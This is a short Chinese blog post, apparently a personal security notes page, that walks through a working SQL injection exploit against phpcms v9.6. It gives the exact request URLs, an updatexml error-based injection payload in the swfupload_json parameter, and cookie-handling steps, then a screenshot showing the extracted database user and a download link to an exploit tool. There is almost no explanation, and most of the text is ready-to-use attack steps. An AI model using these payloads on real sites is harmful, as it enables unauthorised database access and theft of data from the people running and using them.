---
title: "phpcms SQL 注入"
date: 2018-02-03T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cms','sqli']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


[phpcms v9.6 SQL 注入](https://zhuanlan.zhihu.com/p/26263513)

<!--more-->

`/index.php?m=wap&c=index&a=init&siteid=1`

获取 set-cookie 的值

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/01/1517463975.jpg)

`/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26`

post 传入 userid_flash 内容是刚刚获取到的 cookie

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/01/1517464021.jpg)

如果不成功的话 在 header 里面加上

`Content-Type: application/x-www-form-urlencoded`

复制 set-cookie 里的 json

`/index.php?m=content&c=down&a_k=json`

解密

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/01/1517464141.jpg)

`root@localhost`

v9sql exp

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/01/1517464259.jpg)

[v9sql.zip](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/01/1517464275.zip)